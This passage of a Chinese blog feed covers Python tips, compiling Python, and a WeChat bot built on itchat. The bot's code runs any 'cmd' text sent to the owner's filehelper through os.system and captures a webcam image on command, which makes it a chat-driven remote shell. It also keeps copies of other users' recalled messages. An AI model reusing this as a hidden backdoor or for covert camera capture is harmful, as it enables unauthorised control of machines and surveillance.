python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"></span><br><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = a + b</span><br><span class="line"><span class="built_in">print</span>(c) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">end_time = time.time()</span><br><span class="line">total_time = end_time - start_time</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Time: &quot;</span>, total_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (&#x27;Time: &#x27;, 1.1205673217773438e-05)  </span></span><br></pre></td></tr></table></figure><h3 id="23-Try-else"><a href="#23-Try-else" class="headerlink" title="23.Try else"></a><strong>23.Try else</strong></h3><p>我们在使用 try/except 语句的时候也可以加一个 else 子句，如果没有触发错误的话，这个子句就会被运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="number">2</span>*<span class="number">3</span></span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;An exception was raised&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thank God, no exceptions were raised.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Thank God, no exceptions were raised.</span></span><br></pre></td></tr></table></figure><h3 id="24-元素频率"><a href="#24-元素频率" class="headerlink" title="24. 元素频率"></a><strong>24. 元素频率</strong></h3><p>下面的方法会根据元素频率取列表中最常见的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">most_frequent</span>(<span class="params"><span class="built_in">list</span></span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">set</span>(<span class="built_in">list</span>), key = <span class="built_in">list</span>.count)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line">most_frequent(<span class="built_in">list</span>)  </span><br></pre></td></tr></table></figure><h3 id="25-回文序列"><a href="#25-回文序列" class="headerlink" title="25. 回文序列"></a><strong>25. 回文序列</strong></h3><p>以下方法会检查给定的字符串是不是回文序列，它首先会把所有字母转化为小写，并移除非英文字母符号。最后，它会对比字符串与反向字符串是否相等，相等则表示为回文序列。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">palindrome</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">from</span> re <span class="keyword">import</span> sub</span><br><span class="line">    s = sub(<span class="string">&#x27;[\W_]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, string.lower())</span><br><span class="line">    <span class="keyword">return</span> s == s[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">palindrome(<span class="string">&#x27;taco cat&#x27;</span>) <span class="comment"># True</span></span><br></pre></td></tr></table></figure><h3 id="26-不使用-if-else-的计算子"><a href="#26-不使用-if-else-的计算子" class="headerlink" title="26. 不使用 if-else 的计算子"></a><strong>26. 不使用 if-else 的计算子</strong></h3><p>这一段代码可以不使用条件语句就实现加减乘除、求幂操作，它通过字典这一数据结构实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> operator</span><br><span class="line">action = &#123;</span><br><span class="line">    <span class="string">&quot;+&quot;</span>: operator.add,</span><br><span class="line">    <span class="string">&quot;-&quot;</span>: operator.sub,</span><br><span class="line">    <span class="string">&quot;/&quot;</span>: operator.truediv,</span><br><span class="line">    <span class="string">&quot;*&quot;</span>: operator.mul,</span><br><span class="line">    <span class="string">&quot;**&quot;</span>: <span class="built_in">pow</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(action[<span class="string">&#x27;-&#x27;</span>](<span class="number">50</span>, <span class="number">25</span>)) <span class="comment"># 25</span></span><br></pre></td></tr></table></figure><h3 id="27-Shuffle"><a href="#27-Shuffle" class="headerlink" title="27.Shuffle"></a><strong>27.Shuffle</strong></h3><p>该算法会打乱列表元素的顺序，它主要会通过 Fisher-Yates 算法对新列表进行排序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shuffle</span>(<span class="params">lst</span>):</span><br><span class="line">    temp_lst = deepcopy(lst)</span><br><span class="line">    m = <span class="built_in">len</span>(temp_lst)</span><br><span class="line">    <span class="keyword">while</span> (m):</span><br><span class="line">        m -= <span class="number">1</span></span><br><span class="line">        i = randint(<span class="number">0</span>, m)</span><br><span class="line">        temp_lst[m], temp_lst[i] = temp_lst[i], temp_lst[m]</span><br><span class="line">    <span class="keyword">return</span> temp_lst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">foo = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">shuffle(foo) <span class="comment"># [2,3,1] , foo = [1,2,3]</span></span><br></pre></td></tr></table></figure><h3 id="28-展开列表"><a href="#28-展开列表" class="headerlink" title="28. 展开列表"></a><strong>28. 展开列表</strong></h3><p>将列表内的所有元素，包括子列表，都展开成一个列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">spread</span>(<span class="params">arg</span>):</span><br><span class="line">    ret = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(i, <span class="built_in">list</span>):</span><br><span class="line">            ret.extend(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ret.append(i)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">spread([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>],<span class="number">8</span>,<span class="number">9</span>]) <span class="comment"># [1,2,3,4,5,6,7,8,9]</span></span><br></pre></td></tr></table></figure><h3 id="29-交换值"><a href="#29-交换值" class="headerlink" title="29. 交换值"></a><strong>29. 交换值</strong></h3><p>不需要额外的操作就能交换两个变量的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">swap</span>(<span class="params">a, b</span>):</span><br><span class="line">  <span class="keyword">return</span> b, a</span><br><span class="line"></span><br><span class="line">a, b = -<span class="number">1</span>, <span class="number">14</span></span><br><span class="line">swap(a, b) <span class="comment"># (14, -1)</span></span><br><span class="line">spread([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>],<span class="number">8</span>,<span class="number">9</span>]) <span class="comment"># [1,2,3,4,5,6,7,8,9]</span></span><br></pre></td></tr></table></figure><h3 id="30-字典默认值"><a href="#30-字典默认值" class="headerlink" title="30. 字典默认值"></a><strong>30. 字典默认值</strong></h3><p>通过 Key 取对应的 Value 值，可以通过以下方式设置默认值。如果 get() 方法没有设置默认值，那么如果遇到不存在的 Key，则会返回 None。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d.get(<span class="string">&#x27;c&#x27;</span>, <span class="number">3</span>)) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译安装Python</title>
      <link href="/posts/19621.html"/>
      <url>/posts/19621.html</url>
      
        <content type="html"><![CDATA[<h3 id="准备："><a href="#准备：" class="headerlink" title="准备："></a>准备：</h3><ul><li><p>安装<code>gcc</code> <code>g++</code>编译器和<code>make</code> :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc g++ make</span><br></pre></td></tr></table></figure></li><li><p>安装依赖：</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zlib1g-dev libssl-dev libffi-dev libsqlite3-dev uuid-dev libbz2-dev libreadline-dev liblzma-dev libncurses5-dev libmysqlclient-dev</span><br></pre></td></tr></table></figure></li><li><p>解压Python安装包</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.python.org/ftp/python/3.7.6/Python-3.7.6.tgz</span><br></pre></td></tr></table></figure></li></ul><h3 id="开始安装："><a href="#开始安装：" class="headerlink" title="开始安装："></a><strong>开始安装</strong>：</h3><ul><li><p><code>cd</code>到刚刚解压的Python路径中，然后运行 <code>./configure</code>命令:</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd Python-3.7.6</span><br><span class="line">./configure --enable-optimizations</span><br></pre></td></tr></table></figure></li><li><p>运行以下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure></li><li><p>查看安装版本：</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -V</span><br></pre></td></tr></table></figure></li></ul><h3 id="安装最新版pip"><a href="#安装最新版pip" class="headerlink" title="安装最新版pip :"></a><strong>安装最新版</strong><code>pip</code> :</h3><ul><li><p>下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py</span><br><span class="line">sudo python3 get-pip.py -i  https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure></li><li><p>查看安装版本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip -V</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者</span></span><br><span class="line">pip3 -V</span><br></pre></td></tr></table></figure></li></ul><h3 id="修改pypi镜像源："><a href="#修改pypi镜像源：" class="headerlink" title="修改pypi镜像源："></a><strong>修改pypi镜像源</strong>：</h3><ul><li><p>清华：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></li><li><p>阿里云：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 config set global.index-url https://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure></li><li><p>安装第三方库时可能还需要：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-dev    # 可以暂时不安装</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现可扩展微信机器人和黑科技</title>
      <link href="/posts/56855.html"/>
      <url>/posts/56855.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.com/large/e3bf8736gy1g3d7qhjp6tj21900u0qv6.jpg"></p><span id="more"></span><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;为了方便和效率，这里我使用了一个在开源社区比较流行的框架<code>itchat</code>，缺少的库请自行安装，我的开发环境比较乱，就不导出<code>requirement.txt</code>了。我也有自己分析的一套登陆以及消息轮询的代码，但是我是懒癌晚期，不想维护和提供长期服务什么的。这里使用开源框架做示例也比较方便你自己去查文档。</p><p>&emsp;&emsp;我也看到网上很多人有很多种有趣的玩法，一些不是玩网一族的人看不出来这个能实现什么功能。它就像微信给的小程序一样，微信提供的只是接口，各种功能都是开发者想出来，我几年前做QQ机器人，也是用web端协议，当时集成的有一言接口，图灵接口，日历接口，文字游戏接口，图片回复接口，猜谜等第三方接口，还实现了后台牛牛系统(赌博系统)，信息管理系统，定时通知功能等。所以说如果不去开发它，就没什么意义了。</p><h3 id="示例代码解析"><a href="#示例代码解析" class="headerlink" title="示例代码解析"></a>示例代码解析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itchat, os, time, cv2</span><br><span class="line"><span class="keyword">from</span> itchat.content <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 说明：可以撤回的有文本文字、语音、视频、图片、位置、名片、分享、附件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;msg_id:(msg_from,msg_to,msg_time,msg_time_rec,msg_type,msg_content,msg_share_url)&#125;</span></span><br><span class="line">msg_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件存储临时目录</span></span><br><span class="line">rev_tmp_dir = <span class="string">r&#x27;C:\Users\Administrator\Desktop\ARMProjects\WeChat\\&#x27;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(rev_tmp_dir): os.mkdir(rev_tmp_dir)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 表情有一个问题 | 接受信息和接受note的msg_id不一致 巧合解决方案</span></span><br><span class="line">face_bug = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">sendMsg = <span class="string">u&quot;&#123;消息助手&#125;：微信助手开启，主人正在休息，稍后回复。&quot;</span></span><br><span class="line">usageMsg = <span class="string">u&quot;使用方法：\n1.运行CMD命令：cmd xxx (xxx为命令)\n&quot;</span> \</span><br><span class="line">           <span class="string">u&quot;-例如关机命令:\ncmd shutdown -s -t 0 \n&quot;</span> \</span><br><span class="line">           <span class="string">u&quot;2.获取当前电脑用户：cap\n3.启用消息助手(默认关闭)：ast\n&quot;</span> \</span><br><span class="line">           <span class="string">u&quot;4.关闭消息助手：astc&quot;</span></span><br><span class="line">flag = <span class="number">0</span>  <span class="comment"># 消息助手开关</span></span><br><span class="line">filename = <span class="string">&quot;&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&#x27;%Y-%m-%d&#x27;</span>, time.localtime(time.time())))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.seek(<span class="number">0</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(text + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;-&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@itchat.msg_register(<span class="params"><span class="string">&#x27;Text&#x27;</span>, isGroupChat=<span class="literal">False</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text_reply</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">global</span> face_bug</span><br><span class="line">    message = msg[<span class="string">&#x27;Text&#x27;</span>]</span><br><span class="line">    fromName = msg[<span class="string">&#x27;FromUserName&#x27;</span>]</span><br><span class="line">    toName = msg[<span class="string">&#x27;ToUserName&#x27;</span>]</span><br><span class="line">    msg_from = (itchat.search_friends(userName=msg[<span class="string">&#x27;FromUserName&#x27;</span>]))[<span class="string">&quot;NickName&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取的是本地时间戳并格式化本地时间戳 e: 2017-04-21 21:30:08</span></span><br><span class="line">    msg_time_rec = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime(time.time()))</span><br><span class="line">    <span class="comment"># 消息ID</span></span><br><span class="line">    msg_id = msg[<span class="string">&#x27;MsgId&#x27;</span>]</span><br><span class="line">    <span class="comment"># 消息时间</span></span><br><span class="line">    msg_time = msg[<span class="string">&#x27;CreateTime&#x27;</span>]</span><br><span class="line">    <span class="comment"># 消息发送人昵称 | 这里也可以使用RemarkName备注　但是自己或者没有备注的人为None</span></span><br><span class="line">    msg_from = (itchat.search_friends(userName=msg[<span class="string">&#x27;FromUserName&#x27;</span>]))[<span class="string">&quot;NickName&quot;</span>]</span><br><span class="line">    <span class="comment"># 消息内容</span></span><br><span class="line">    msg_content = msg[<span class="string">&#x27;Text&#x27;</span>]</span><br><span class="line">    <span class="comment"># 分享的链接</span></span><br><span class="line">    msg_share_url = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    face_bug = msg_content</span><br><span class="line">    <span class="comment"># 更新字典</span></span><br><span class="line">    msg_dict.update(</span><br><span class="line">        &#123;</span><br><span class="line">            msg_id: &#123;</span><br><span class="line">                <span class="string">&quot;msg_from&quot;</span>: msg_from, <span class="string">&quot;msg_time&quot;</span>: msg_time, <span class="string">&quot;msg_time_rec&quot;</span>: msg_time_rec,</span><br><span class="line">                <span class="string">&quot;msg_type&quot;</span>: msg[<span class="string">&quot;Type&quot;</span>],</span><br><span class="line">                <span class="string">&quot;msg_content&quot;</span>: msg_content, <span class="string">&quot;msg_share_url&quot;</span>: msg_share_url</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;昌哥&#x27;</span> <span class="keyword">in</span> msg[<span class="string">&#x27;Text&#x27;</span>] <span class="keyword">or</span> <span class="string">&#x27;阿昌&#x27;</span> <span class="keyword">in</span> msg[<span class="string">&#x27;Text&#x27;</span>] <span class="keyword">or</span> <span class="string">&#x27;DAOJI&#x27;</span> <span class="keyword">in</span> msg[<span class="string">&#x27;Text&#x27;</span>].upper():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            msg.user.send_image(<span class="string">&#x27;./190427-130223.png&#x27;</span>)</span><br><span class="line">            <span class="comment"># itchat.send_image(&#x27;./190427-130223.png&#x27;, toName)</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            traceback.print_exc()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> toName == <span class="string">&quot;filehelper&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">&quot;cap&quot;</span>:</span><br><span class="line">            cap = cv2.VideoCapture(<span class="number">0</span>)</span><br><span class="line">            ret, img = cap.read()</span><br><span class="line">            cv2.imwrite(<span class="string">&quot;weixinTemp.jpg&quot;</span>, img)</span><br><span class="line">            itchat.send(<span class="string">&#x27;@img@%s&#x27;</span> % <span class="string">u&#x27;weixinTemp.jpg&#x27;</span>, <span class="string">&#x27;filehelper&#x27;</span>)</span><br><span class="line">            cap.release()</span><br><span class="line">        <span class="keyword">if</span> message[<span class="number">0</span>:<span class="number">3</span>] == <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">            os.system(message.strip(message[<span class="number">0</span>:<span class="number">4</span>]))</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">&quot;ast&quot;</span>:</span><br><span class="line">            flag = <span class="number">1</span></span><br><span class="line">            itchat.send(<span class="string">&quot;消息助手已开启&quot;</span>, <span class="string">&quot;filehelper&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">&quot;astc&quot;</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            itchat.send(<span class="string">&quot;消息助手已关闭&quot;</span>, <span class="string">&quot;filehelper&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> flag == <span class="number">1</span>:</span><br><span class="line">        itchat.send(sendMsg, fromName)</span><br><span class="line">        log(<span class="string">&#x27;&#123;0&#125;    &#123;1&#125;:\n\n&#123;2&#125;&#x27;</span>.<span class="built_in">format</span>(msg_time_rec, msg_from, message))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># TODO(Daoji) 2019/4/27 群聊艾特</span></span><br><span class="line"><span class="meta">@itchat.msg_register(<span class="params">TEXT, isGroupChat=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text_reply</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">if</span> msg.isAt:</span><br><span class="line">        msg.user.send(<span class="string">u&#x27;@%s\u2005I received: %s&#x27;</span> % (</span><br><span class="line">            msg.actualNickName, msg.text))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将接收到的消息存放在字典中，当接收到新消息时对字典中超时的消息进行清理 | 不接受不具有撤回功能的信息</span></span><br><span class="line"><span class="comment"># [TEXT, PICTURE, MAP, CARD, SHARING, RECORDING, ATTACHMENT, VIDEO, FRIENDS, NOTE]</span></span><br><span class="line"><span class="meta">@itchat.msg_register(<span class="params">[PICTURE, MAP, CARD, SHARING, RECORDING, ATTACHMENT, VIDEO]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handler_receive_msg</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">global</span> face_bug</span><br><span class="line">    <span class="comment"># 获取的是本地时间戳并格式化本地时间戳 e: 2017-04-21 21:30:08</span></span><br><span class="line">    msg_time_rec = time.strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime())</span><br><span class="line">    <span class="comment"># 消息ID</span></span><br><span class="line">    msg_id = msg[<span class="string">&#x27;MsgId&#x27;</span>]</span><br><span class="line">    <span class="comment"># 消息时间</span></span><br><span class="line">    msg_time = msg[<span class="string">&#x27;CreateTime&#x27;</span>]</span><br><span class="line">    <span class="comment"># 消息发送人昵称 | 这里也可以使用RemarkName备注　但是自己或者没有备注的人为None</span></span><br><span class="line">    msg_from = (itchat.search_friends(userName=msg[<span class="string">&#x27;FromUserName&#x27;</span>]))[<span 